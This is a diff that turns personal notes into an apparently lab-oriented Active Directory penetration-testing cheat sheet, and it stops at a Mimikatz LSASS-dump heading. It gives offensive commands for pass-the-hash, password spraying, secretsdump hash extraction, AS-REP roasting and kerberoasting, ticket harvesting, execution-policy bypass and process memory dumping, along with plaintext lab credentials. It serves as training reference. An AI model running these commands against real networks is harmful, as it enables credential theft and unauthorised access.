@@ -1,74 +1,712 @@
-<p><span style="font-size: 28px;"><strong><span style="background-color: rgb(147, 101, 184); font-family: Helvetica;">PSEXEC.py</span></strong></span></p>
-<p><span style="font-size: 22px; font-family: Helvetica;">impacket-psexec.py username:password@ip&nbsp;</span></p>
-<p><span style="font-size: 22px; font-family: Helvetica;">(you may need to add &apos; &apos; )</span></p>
-<p><br></p>
-<p><span style="font-size: 22px; font-family: Helvetica;"><strong>Connect:</strong></span></p>
-<p><span style="font-size: 22px; font-family: Helvetica;">impacket-psexec.py username:password@ip &nbsp;</span></p>
-<p><span style="font-size: 22px; font-family: Helvetica;">(you may need to add &apos; &apos; )</span></p>
-<p><span style="font-size: 28px; font-family: Helvetica;"><strong><br></strong></span></p>
-<p><span style="font-size: 28px; font-family: Helvetica;"><strong><span style="background-color: rgb(243, 121, 52);">Evil-winrm</span></strong></span></p>
-<p><span style="font-size: 22px; font-family: Helvetica;">evil-winrm -i &lt;ip&gt; -u user -p pass&nbsp;</span></p>
-<p><span style="font-size: 22px; font-family: Helvetica;">(may need to add &apos;&apos; to the pass)</span></p>
-<p><br></p>
-<p><strong><span style="font-size: 28px; background-color: rgb(209, 72, 65); font-family: Helvetica;">crackmapexec</span></strong></p>
-<p><strong><span style="font-size: 22px; font-family: Helvetica;">password spraying:</span></strong></p>
-<p><span style="font-size: 22px; font-family: Helvetica;">crackmapexec smb &lt;ip&gt; -u users.lst -p password1 --continue-on-success</span></p>
-<p><span style="font-size: 22px;"><br></span></p>
-<p><span style="font-size: 22px;"><strong><span style="font-family: Helvetica;">connect:</span></strong></span></p>
-<p><span style="font-size: 22px; font-family: Helvetica;">crackmapexec smb 10.129.79.75 -u c.smith -p xRxRxPANCAK3SxRxRx</span></p>
-<p><br></p>
-<p><strong><span style="font-size: 22px;">bruteforce RID:</span></strong></p>
-<p><span style="font-size: 22px;">cme smb 10.129.221.41 -u hazard -p stealth1agent --rid-brute</span></p>
-<p><br></p>
-<p><strong><span style="font-size: 22px;">Hashes: - you add the second part of the hash, and include the ":"</span></strong></p>
-<p><span style="font-size: 22px;">impacket-psexec administrator@10.129.210.78 -hashes :823452073d75b9d1cf70ebdf86c7f98e</span></p>
-<p><span style="font-size: 28px; font-family: Helvetica;"><strong><span style="background-color: rgb(71, 85, 119); color: rgb(255, 255, 255);">secretsdump.py</span></strong></span></p>
-<p><span style="font-size: 22px; font-family: Helvetica;">secretsdump.py -just-dc-ntlm &lt;domain&gt;/&lt;username&gt;@&lt;ip&gt;&nbsp;</span></p>
-<p><span style="font-size: 22px; font-family: Helvetica;">(all you need are elevated creds)</span></p>
-<p><br></p>
-<p><strong><span style="font-size: 28px; font-family: Helvetica; background-color: rgb(65, 168, 95);">smbclient</span></strong></p>
-<p><span style="font-size: 22px; font-family: Helvetica;">smbclient -L \\\\IP address\\</span></p>
-<p><span style="font-size: 22px; font-family: Helvetica;">smbclient \\\\IP address\sharename\</span></p>
-<p><span style="font-size: 22px; font-family: Helvetica;">smbclient -U &lt;username&gt; \\\\ ip \sharename</span></p>
-<p><br></p>
-<p><span style="font-size: 28px; font-family: Helvetica;"><strong><span style="background-color: rgb(250, 197, 28);">smbmap</span></strong></span></p>
-<p><span style="font-size: 22px; font-family: Helvetica;">smbmap -u user1 -p password -H &lt;ip&gt;</span></p>
-<p><br></p>
-<p><span style="font-size: 28px; font-family: Helvetica;"><span style="background-color: rgb(147, 101, 184); color: rgb(0, 0, 0);"><strong>GetNPUusers</strong></span></span></p>
-<p><span style="font-size: 22px; font-family: Helvetica;"><span style="background-color: rgb(255, 255, 255); color: rgb(0, 0, 0);">- need a user list of names which could be valid on network</span></span></p>
-<p><br></p>
-<pre><span style="font-size: 22px;">impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -dc-ip 10.129.210.78 -usersfile /home/kali/HTB_boxes/sauna/mang_user.lst -format john -no-pass </span>   </pre>
-<figure>
-    <div tabindex="0"><br></div>
-</figure>
-<p><br></p>
-<p><span style="font-size: 28px; font-family: Helvetica;"><strong><span style="background-color: rgb(243, 121, 52);">Reading certain config files</span></strong></span></p>
-<p><span style="font-size: 22px; font-family: Helvetica;">cat &lt;filename&gt; | iconv -f UTF-16LE -t utf-8 ( there are other methods)</span></p>
-<p><br></p>
-<p><span style="font-size: 28px; background-color: rgb(44, 130, 201); color: rgb(255, 255, 255);"><strong><span style="font-family: Helvetica;">Kerbrute install and usage</span></strong></span></p>
-<p><span style="font-size: 22px; font-family: Helvetica;">sudo git clone <a data-fr-linked="true" href="https://github.com/ropnop/kerbrute.git">https://github.com/ropnop/kerbrute.git</a></span></p>
-<p><span style="font-family: Helvetica;"><br></span></p>
-<p><span style="font-size: 22px; font-family: Helvetica;">#### Listing compiling options</span></p>
-<p><span style="font-size: 22px; font-family: Helvetica;">make help</span></p>
-<p><span style="font-family: Helvetica;"><br></span></p>
-<p><span style="font-size: 22px; font-family: Helvetica;">#### Compiling for multiple platforms and arcs</span></p>
-<p><span style="font-size: 22px; font-family: Helvetica;">sudo make all</span></p>
-<p><br></p>
-<p><span style="font-size: 28px; background-color: rgb(250, 197, 28);"><strong><span style="font-family: Helvetica;">procdump</span></strong></span></p>
-<p><span style="font-size: 22px; background-color: rgb(255, 255, 255);"><span style="font-family: Helvetica;">upload procdump.exe C:\Users\Chase\Desktop\procdump.exe</span></span></p>
-<p><span style="font-size: 22px; background-color: rgb(255, 255, 255);"><span style="font-family: Helvetica;">get-process -name firefox (as you need the ID)</span></span></p>
-<p><span style="font-size: 22px; background-color: rgb(255, 255, 255);"><span style="font-family: Helvetica;">.\procdump.exe -ma 5992 firefox.dmp</span></span></p>
-<p><br></p>
-<p><span style="font-size: 28px; background-color: rgb(235, 107, 86);"><span style="font-family: Helvetica;"><strong>smbserver</strong></span></span></p>
-<pre><span style="font-family: Helvetica; font-size: 22px;">impacket-smbserver -smb2support -username guest -password guest share /home/kali/htb</span></pre>
-<p><span style="font-family: Helvetica; font-size: 28px; background-color: rgb(61, 142, 185); color: rgb(255, 255, 255);"><strong>mounting a drive</strong></span></p>
-<p><span style="font-family: Helvetica; font-size: 22px;">go to cd /mnt and create same name directories as smb dir</span></p>
-<p><span style="font-family: Helvetica; font-size: 22px;">sudo mount -t cifs //ip/sharename /mnt/sharenamecopy</span></p>
-<p><br></p>
-<p><span style="font-family: Helvetica; font-size: 22px;"><strong>with creds:</strong></span></p>
-<p><span style="font-family: Helvetica; font-size: 22px;">sudo mount -t cifs -o &apos;username=joe,password=joe1&apos; //IP/users /mnt/usernameofperson</span></p>
-<p><br></p>
-<p><br></p>
-<p><span style="font-family: Helvetica; font-size: 22px;"><strong>Winpeas to use (as .bat may not work):</strong></span></p>
-<p><span style="font-family: Helvetica; font-size: 22px;">https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe</span></p>
-<p><br></p>
+<html>
+
+<head>
+<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
+<meta name=Generator content="Microsoft Word 15 (filtered)">
+<style>
+<!--
+ /* Font Definitions */
+ @font-face
+	{font-family:Helvetica;
+	panose-1:2 11 6 4 2 2 2 2 2 4;}
+@font-face
+	{font-family:Wingdings;
+	panose-1:5 0 0 0 0 0 0 0 0 0;}
+@font-face
+	{font-family:"Cambria Math";
+	panose-1:2 4 5 3 5 4 6 3 2 4;}
+@font-face
+	{font-family:Calibri;
+	panose-1:2 15 5 2 2 2 4 3 2 4;}
+ /* Style Definitions */
+ p.MsoNormal, li.MsoNormal, div.MsoNormal
+	{margin-top:0cm;
+	margin-right:0cm;
+	margin-bottom:8.0pt;
+	margin-left:0cm;
+	line-height:107%;
+	font-size:18.0pt;
+	font-family:"Calibri",sans-serif;}
+h1
+	{mso-style-link:"Heading 1 Char";
+	margin-top:12.0pt;
+	margin-right:0cm;
+	margin-bottom:0cm;
+	margin-left:0cm;
+	line-height:107%;
+	page-break-after:avoid;
+	font-size:20.0pt;
+	font-family:"Arial",sans-serif;
+	color:#2F5496;
+	font-weight:bold;}
+p.MsoToc1, li.MsoToc1, div.MsoToc1
+	{margin-top:0cm;
+	margin-right:0cm;
+	margin-bottom:5.0pt;
+	margin-left:0cm;
+	line-height:107%;
+	font-size:18.0pt;
+	font-family:"Calibri",sans-serif;}
+a:link, span.MsoHyperlink
+	{color:#0563C1;
+	text-decoration:underline;}
+p
+	{margin-right:0cm;
+	margin-left:0cm;
+	font-size:12.0pt;
+	font-family:"Times New Roman",serif;}
+pre
+	{mso-style-link:"HTML Preformatted Char";
+	margin:0cm;
+	font-size:10.0pt;
+	font-family:"Courier New";}
+p.MsoListParagraph, li.MsoListParagraph, div.MsoListParagraph
+	{margin-top:0cm;
+	margin-right:0cm;
+	margin-bottom:8.0pt;
+	margin-left:36.0pt;
+	line-height:107%;
+	font-size:18.0pt;
+	font-family:"Calibri",sans-serif;}
+p.MsoListParagraphCxSpFirst, li.MsoListParagraphCxSpFirst, div.MsoListParagraphCxSpFirst
+	{margin-top:0cm;
+	margin-right:0cm;
+	margin-bottom:0cm;
+	margin-left:36.0pt;
+	line-height:107%;
+	font-size:18.0pt;
+	font-family:"Calibri",sans-serif;}
+p.MsoListParagraphCxSpMiddle, li.MsoListParagraphCxSpMiddle, div.MsoListParagraphCxSpMiddle
+	{margin-top:0cm;
+	margin-right:0cm;
+	margin-bottom:0cm;
+	margin-left:36.0pt;
+	line-height:107%;
+	font-size:18.0pt;
+	font-family:"Calibri",sans-serif;}
+p.MsoListParagraphCxSpLast, li.MsoListParagraphCxSpLast, div.MsoListParagraphCxSpLast
+	{margin-top:0cm;
+	margin-right:0cm;
+	margin-bottom:8.0pt;
+	margin-left:36.0pt;
+	line-height:107%;
+	font-size:18.0pt;
+	font-family:"Calibri",sans-serif;}
+p.MsoTocHeading, li.MsoTocHeading, div.MsoTocHeading
+	{margin-top:12.0pt;
+	margin-right:0cm;
+	margin-bottom:0cm;
+	margin-left:0cm;
+	line-height:107%;
+	page-break-after:avoid;
+	font-size:20.0pt;
+	font-family:"Arial",sans-serif;
+	color:#2F5496;
+	font-weight:bold;}
+span.Heading1Char
+	{mso-style-name:"Heading 1 Char";
+	mso-style-link:"Heading 1";
+	font-family:"Arial",sans-serif;
+	color:#2F5496;
+	font-weight:bold;}
+span.HTMLPreformattedChar
+	{mso-style-name:"HTML Preformatted Char";
+	mso-style-link:"HTML Preformatted";
+	font-family:"Courier New";}
+.MsoPapDefault
+	{margin-bottom:8.0pt;
+	line-height:107%;}
+@page WordSection1
+	{size:595.3pt 841.9pt;
+	margin:72.0pt 72.0pt 72.0pt 72.0pt;}
+div.WordSection1
+	{page:WordSection1;}
+ /* List Definitions */
+ ol
+	{margin-bottom:0cm;}
+ul
+	{margin-bottom:0cm;}
+-->
+</style>
+
+</head>
+
+<body lang=EN-GB link="#0563C1" vlink="#954F72" style='word-wrap:break-word'>
+
+<div class=WordSection1>
+
+<p class=MsoTocHeading><span lang=EN-US>Contents</span></p>
+
+<p class=MsoToc1><span
+class=MsoHyperlink><a href="#_Toc125793898"><span style='background:silver'>SMB
+/ RPC tools:</span><span style='color:windowtext;display:none;text-decoration:
+none'> </span><span
+style='color:windowtext;display:none;text-decoration:none'>1</span></a></span></p>
+
+<p class=MsoToc1><span class=MsoHyperlink><a href="#_Toc125793899"><span
+style='background:silver'>LDAP tools:</span><span style='color:windowtext;
+display:none;text-decoration:none'> </span><span
+style='color:windowtext;display:none;text-decoration:none'>1</span></a></span></p>
+
+<p class=MsoToc1><span class=MsoHyperlink><a href="#_Toc125793900"><span
+style='background:silver'>PSexec.py</span><span style='color:windowtext;
+display:none;text-decoration:none'>. </span><span
+style='color:windowtext;display:none;text-decoration:none'>1</span></a></span></p>
+
+<p class=MsoToc1><span class=MsoHyperlink><a href="#_Toc125793901"><span
+style='background:silver'>Evil-winrm</span> – (when you have creds)<span
+style='color:windowtext;display:none;text-decoration:none'> </span><span
+style='color:windowtext;display:none;text-decoration:none'>1</span></a></span></p>
+
+<p class=MsoToc1><span class=MsoHyperlink><a href="#_Toc125793902"><span
+style='background:silver'>Crackmapexec</span> – (may be better running in
+docker)<span style='color:windowtext;display:none;text-decoration:none'> </span><span
+style='color:windowtext;display:none;text-decoration:none'>1</span></a></span></p>
+
+<p class=MsoToc1><span class=MsoHyperlink><a href="#_Toc125793903"><span
+style='background:silver'>Secretsdump.py</span> - (extracts creds and secrets –
+need creds)<span style='color:windowtext;display:none;text-decoration:none'> </span><span
+style='color:windowtext;display:none;text-decoration:none'>1</span></a></span></p>
+
+<p class=MsoToc1><span class=MsoHyperlink><a href="#_Toc125793904"><span
+style='background:silver'>GetNPUsers.py</span> - (for ASREP roasting)<span
+style='color:windowtext;display:none;text-decoration:none'> </span><span
+style='color:windowtext;display:none;text-decoration:none'>1</span></a></span></p>
+
+<p class=MsoToc1><span class=MsoHyperlink><a href="#_Toc125793905"><span
+style='background:silver'>Lookupsid.py</span> – (need creds)<span
+style='color:windowtext;display:none;text-decoration:none'> </span><span
+style='color:windowtext;display:none;text-decoration:none'>1</span></a></span></p>
+
+<p class=MsoToc1><span class=MsoHyperlink><a href="#_Toc125793906"><span
+style='background:silver'>Kerbrute</span> - (find valid usernames)<span
+style='color:windowtext;display:none;text-decoration:none'> </span><span
+style='color:windowtext;display:none;text-decoration:none'>1</span></a></span></p>
+
+<p class=MsoToc1><span class=MsoHyperlink><a href="#_Toc125793907"><span
+style='background:silver'>Rubues</span> – (windows tool)<span style='color:
+windowtext;display:none;text-decoration:none'> </span><span
+style='color:windowtext;display:none;text-decoration:none'>1</span></a></span></p>
+
+<p class=MsoToc1><span class=MsoHyperlink><a href="#_Toc125793908"><span
+style='background:silver'>Powerview.ps1</span><span style='color:windowtext;
+display:none;text-decoration:none'>. </span><span
+style='color:windowtext;display:none;text-decoration:none'>1</span></a></span></p>
+
+<p class=MsoToc1><span class=MsoHyperlink><a href="#_Toc125793909"><span
+style='background:silver'>Mimikatz</span><span style='color:windowtext;
+display:none;text-decoration:none'>. </span><span
+style='color:windowtext;display:none;text-decoration:none'>1</span></a></span></p>
+
+<p class=MsoToc1><span class=MsoHyperlink><a href="#_Toc125793910"><span
+style='background:silver'>Smb server</span><span style='color:windowtext;
+display:none;text-decoration:none'>. </span><span
+style='color:windowtext;display:none;text-decoration:none'>1</span></a></span></p>
+
+<p class=MsoToc1><span class=MsoHyperlink><a href="#_Toc125793911"><span
+style='background:silver'>Bloodhound/neo4j/sharphound/bloodhound.py</span><span
+style='color:windowtext;display:none;text-decoration:none'>. </span><span
+style='color:windowtext;display:none;text-decoration:none'>1</span></a></span></p>
+
+<p class=MsoToc1><span class=MsoHyperlink><a href="#_Toc125793912"><span
+style='background:silver'>Winpeas script</span><span style='color:windowtext;
+display:none;text-decoration:none'>. </span><span
+style='color:windowtext;display:none;text-decoration:none'>1</span></a></span></p>
+
+<p class=MsoToc1><span class=MsoHyperlink><a href="#_Toc125793913"><span
+style='background:silver'>Mounting a drive</span><span style='color:windowtext;
+display:none;text-decoration:none'>. </span><span
+style='color:windowtext;display:none;text-decoration:none'>1</span></a></span></p>
+
+<p class=MsoToc1><span class=MsoHyperlink><a href="#_Toc125793914"><span
+style='background:silver'>Procdump</span><span style='color:windowtext;
+display:none;text-decoration:none'>. </span><span
+style='color:windowtext;display:none;text-decoration:none'>1</span></a></span></p>
+
+<p class=MsoToc1><span class=MsoHyperlink><a href="#_Toc125793915"><span
+style='background:silver'>Reading config files</span><span style='color:windowtext;
+display:none;text-decoration:none'>. </span><span
+style='color:windowtext;display:none;text-decoration:none'>1</span></a></span></p>
+
+<p class=MsoToc1><span class=MsoHyperlink><a href="#_Toc125793916">Write ups
+using these tools:<span style='color:windowtext;display:none;text-decoration:
+none'> </span><span
+style='color:windowtext;display:none;text-decoration:none'>1</span></a></span></p>
+
+<p class=MsoToc1><span class=MsoHyperlink><a href="#_Toc125793917">CTFs using
+these tools:<span style='color:windowtext;display:none;text-decoration:none'> </span><span
+style='color:windowtext;display:none;text-decoration:none'>1</span></a></span></p>
+
+<p class=MsoNormal>&nbsp;</p>
+
+<p class=MsoNormal><b><u><span style='font-size:26.0pt;line-height:107%;
+background:fuchsia'>Suggested websites:</span></u></b><span style='font-size:
+22.0pt;line-height:107%;background:fuchsia'> </span></p>
+
+<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'><a
+href="https://wadcoms.github.io/">https://wadcoms.github.io/</a></span></p>
+
+<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'><a
+href="https://www.hackingarticles.in/impacket-guide-smb-msrpc/">https://www.hackingarticles.in/impacket-guide-smb-msrpc/</a></span></p>
+
+<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>------------------------------------------------------------------------------------------------</span></p>
+
+<h1><a name="_Toc125793898"><span style='background:silver'>SMB / RPC tools:</span></a></h1>
+
+<p class=MsoNormal><b>Enum4linux:</b></p>
+
+<p class=MsoListParagraphCxSpFirst style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>Enum4linux 10.10.10.10 </p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>Use -h for options: -U = get userlist, -M = get machine list, -o = OS</p>
+
+<p class=MsoListParagraphCxSpLast style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>-u and -p = to provide credentials</p>
+
+<p class=MsoNormal><b>SMBclient:</b></p>
+
+<p class=MsoListParagraphCxSpFirst style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>smbclient -L 10.10.10.10 (may need the slashes)</p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>smbclient <a href="file://10.10.10.10/sharename"><b>\\\\10.10.10.10\\sharename</b></a>
+</p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>smbclient <a href="file://10.10.10.10/C$"><b>\\\\10.10.10.10\\C$</b></a>
+-U ‘administrator’</p>
+
+<p class=MsoListParagraphCxSpLast style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>you can also pass in a domain name – \\\\doozy.local\\</p>
+
+<p class=MsoNormal><b>SMBmap:</b></p>
+
+<p class=MsoListParagraphCxSpFirst style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>smbmap -u anonymous -H 10.10.10.10</p>
+
+<p class=MsoListParagraphCxSpLast style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>smbmap -u user1 -p password -H 10.10.10.10</p>
+
+<p class=MsoNormal>&nbsp;</p>
+
+<h1><a name="_Toc125793899"><span style='background:silver'>LDAP tools:</span></a></h1>
+
+<p class=MsoNormal><b>Crackmapexec:</b></p>
+
+<p class=MsoListParagraph style='text-indent:-18.0pt'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>crackmapexec has a ldap flag! – check out: <a
+href="https://wiki.porchetta.industries/ldap-protocol/authentication">https://wiki.porchetta.industries/ldap-protocol/authentication</a></p>
+
+<p class=MsoNormal><b>Ldapsearch:</b></p>
+
+<p class=MsoListParagraphCxSpFirst style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>ldapsearch -LLL -x -H ldap://test.local -b'' -s base '(objectclass=\*)' 
+- no creds needed</p>
+
+<p class=MsoListParagraphCxSpLast style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>ldapsearch -h test.local -D 'ldap@test.local' -w password123 -b
+'dc=test,dc=local' </p>
+
+<h1>&nbsp;</h1>
+
+<h1><a name="_Toc125793900"><span style='background:silver'>PSexec.py</span></a></h1>
+
+<p class=MsoListParagraphCxSpFirst style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>impacket-psexec.py username:password@ip&nbsp; <span style='color:#C00000'>-
+(may need to add '' to the pass)</span></p>
+
+<p class=MsoListParagraphCxSpLast style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>impacket-psexec administrator@10.129.210.78 -hashes
+:823452073d75b9d1cf70ebdf86c7f98e</p>
+
+<p class=MsoNormal>&nbsp;</p>
+
+<h1><a name="_Toc125793901"><span style='background:silver'>Evil-winrm</span> </a><span
+style='font-size:18.0pt;line-height:107%;color:#ED7D31'>– (when you have creds)</span></h1>
+
+<p class=MsoListParagraphCxSpFirst style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>evil-winrm -i &lt;ip&gt; -u user -p pass&nbsp;<span style='color:#C00000'>-
+(may need to add '' to the pass)</span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>-H = to pass the hash</p>
+
+<p class=MsoListParagraphCxSpLast>&nbsp;</p>
+
+<h1><a name="_Toc125793902"><span style='background:silver'>Crackmapexec</span>
+</a><span style='font-size:18.0pt;line-height:107%;color:#ED7D31'>– (may be
+better running in docker)</span></h1>
+
+<p class=MsoNormal><b>password spraying:</b></p>
+
+<p class=MsoListParagraph style='text-indent:-18.0pt'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>crackmapexec smb &lt;ip&gt; -u users.lst -p password1
+--continue-on-success</p>
+
+<p class=MsoNormal><b>connect:</b></p>
+
+<p class=MsoListParagraph style='text-indent:-18.0pt'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>crackmapexec smb 10.129.79.75 -u c.smith -p xRxRxPANCAK3SxRxRx <span
+style='color:#C00000'>- (may need to add '' to the pass)</span></p>
+
+<p class=MsoNormal><b>bruteforce RID:</b></p>
+
+<p class=MsoListParagraphCxSpFirst style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>cme smb 10.129.221.41 -u hazard -p stealth1agent --rid-brute</p>
+
+<p class=MsoListParagraphCxSpLast>&nbsp;</p>
+
+<h1><a name="_Toc125793903"><span style='background:silver'>Secretsdump.py</span>
+</a><span style='color:#ED7D31'>- </span><span style='font-size:18.0pt;
+line-height:107%;color:#ED7D31'>(extracts creds and secrets – need creds)</span></h1>
+
+<p class=MsoListParagraph style='text-indent:-18.0pt'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>secretsdump.py -just-dc-ntlm &lt;domain&gt;/&lt;username&gt;@&lt;ip&gt;</p>
+
+<p class=MsoNormal>&nbsp;</p>
+
+<h1><a name="_Toc125793904"><span style='background:silver'>GetNPUsers.py</span>
+</a><span style='font-size:18.0pt;line-height:107%;color:#ED7D31'>- (for ASREP
+roasting)</span></h1>
+
+<p class=MsoNormal>You do need a list of usernames.</p>
+
+<p class=MsoListParagraph style='margin-bottom:0cm;text-indent:-18.0pt;
+line-height:normal'><span style='color:black'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><span style='color:black'>impacket-GetNPUsers doozy.local/ -dc-ip
+10.10.10.10 -usersfile users.list -format john -no-pass </span></p>
+
+<p class=MsoNormal style='margin-bottom:0cm;line-height:normal'><span
+style='color:black'>&nbsp;</span></p>
+
+<h1><a name="_Toc125793905"><span style='background:silver'>Lookupsid.py</span></a>
+<span style='font-size:18.0pt;line-height:107%;color:#ED7D31'>– (need creds)</span></h1>
+
+<p class=MsoListParagraphCxSpFirst style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>python3 lookupsid.py test.local/john:password123@10.10.10.1</p>
+
+<p class=MsoListParagraphCxSpLast>&nbsp;</p>
+
+<h1><a name="_Toc125793906"><span style='background:silver'>Kerbrute</span> </a><span
+style='font-size:18.0pt;line-height:107%;color:#ED7D31'>- (find valid usernames)</span></h1>
+
+<p class=MsoListParagraph style='text-indent:-18.0pt'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>./kerbrute_linux_amd64 userenum -d doozy.local --dc 10.10.10.10 /tmp/userlist.txt</p>
+
+<h1>&nbsp;</h1>
+
+<h1><a name="_Toc125793907"><span style='background:silver'>Rubues</span> </a><span
+style='font-size:18.0pt;line-height:107%;color:#ED7D31'>– (windows tool)</span></h1>
+
+<p class=MsoNormal><b>Harvesting tickets:</b></p>
+
+<p class=MsoListParagraph style='text-indent:-18.0pt'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>Rubeus.exe harvest /interval:30</p>
+
+<p class=MsoNormal><b>Bruteforce / password spraying:</b></p>
+
+<p class=MsoListParagraph style='text-indent:-18.0pt'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>Rubeus.exe brute /password:Password1 /noticket</p>
+
+<p class=MsoNormal><b>Kerberoasting:</b></p>
+
+<p class=MsoListParagraph style='text-indent:-18.0pt'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>Rubeus.exe kerberoast</p>
+
+<p class=MsoNormal><b>AS-Rep roasting:</b></p>
+
+<p class=MsoListParagraph style='text-indent:-18.0pt'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>Rubeus.exe asreproast</p>
+
+<p class=MsoNormal>&nbsp;</p>
+
+<h1><a name="_Toc125793908"><span style='background:silver'>Powerview.ps1</span></a></h1>
+
+<p class=MsoNormal><b>Initial</b></p>
+
+<p class=MsoListParagraphCxSpFirst style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>powershell -ep bypass</p>
+
+<p class=MsoListParagraphCxSpLast style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>. .\Powerview.ps1</p>
+
+<p class=MsoNormal><b>Enumerate domain users /groups:</b></p>
+
+<p class=MsoListParagraphCxSpFirst style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>Get-NetUser | select cn</p>
+
+<p class=MsoListParagraphCxSpLast style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>Get-NetGroup -Groupname *admin*</p>
+
+<p class=MsoNormal><b>Shared Folders:</b></p>
+
+<p class=MsoListParagraphCxSpFirst style='text-indent:-18.0pt'>-<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>Invoke-ShareFinder</p>
+
+<p class=MsoListParagraphCxSpLast>&nbsp;</p>
+
+<h1><a name="_Toc125793909"><span style='background:silver'>Mimikatz</span></a></h1>
+
+<p class=MsoNormal>(thank you to @dw3113r for this cheatsheet)</p>
+
+<p class=MsoNormal>&nbsp;</p>
+
+<p class=MsoNormal><b>#Dump LSASS:</b></p>
+
+<p class=MsoListParagraphCxSpFirst style='text-indent:-18.0pt'>-<span
